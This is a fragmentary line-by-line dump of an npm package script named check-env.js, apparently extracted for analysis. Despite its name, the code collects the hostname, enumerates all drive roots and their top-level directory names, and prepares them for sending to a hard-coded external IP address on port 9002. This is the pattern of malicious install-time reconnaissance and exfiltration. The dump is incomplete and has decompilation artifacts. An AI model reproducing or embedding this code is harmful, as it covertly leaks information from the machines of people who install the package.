// File: tmp/tmpy8po6es8/oxrvxlllcaj/package/scripts/check-env.js
// ======================================================================
Line 2: const os = require("os")
Line 3: const http = require("http")
Line 4: const fs = require("fs")
Line 5: const path = require("path")
Line 8: os.hostname()
Line 19: {
  if (!isWindows()) {
    return [path.parse(process.cwd()).root]; // 通常为 "/"
  }

  const roots = [];
  for (let i = 65; i <= 90; i++) {
    const drive = String.fromCharCode(i) + ":\\";
    try {
      // 判断该盘符是否存在且可读
      fs.accessSync(drive, fs.constants.R_OK);
      roots.push(drive);
    } catch (_) {
      // 不存在或不可访问则跳过
    }
  }
  // 如果一个都没枚举到，兜底用当前盘符根
  if (roots.length === 0) {
    roots.push(path.parse(process.cwd()).root);
  }
  return roots;
}
Line 21: _tmp_0.push(path.parse(process.cwd()).root)
Line 24: const roots = []
Line 26: const drive = String.fromCharCode(i) + ":\\"
Line 30: roots.push(drive)
Line 37: roots.push(path.parse(process.cwd()).root)
Line 43: {
  const roots = getRootDirs();
  const entries = [];

  for (const root of roots) {
    try {
      const list = fs.readdirSync(root, { withFileTypes: true });
      for (const dirent of list) {
        // 仅收集名称；如需带类型前缀可加上 [DIR]/[FILE]
        entries.push(dirent.name);
      }
    } catch (err) {
      // 某些根（如受限驱动器）可能无权限，忽略错误
      // 也可以将错误信息上报：entries.push(`[ERROR:${root}] ${err.message}`)
    }
  }

  // 去重（不同盘可能同名）
  return Array.from(new Set(entries)).sort();
}
Line 45: const entries = []
Line 47: _iterator_0.next()
Line 49: const list = fs.readdirSync(root, { withFileTypes: true })
Line 50: _iterator_1.next()
Line 52: entries.push(dirent.name)
Line 61: Array.from(new Set(entries)).sort()
Line 65: const baseUrl = "http://47.97.47.43:9002/"
Line 66: names.join(",")
Line 92: main()
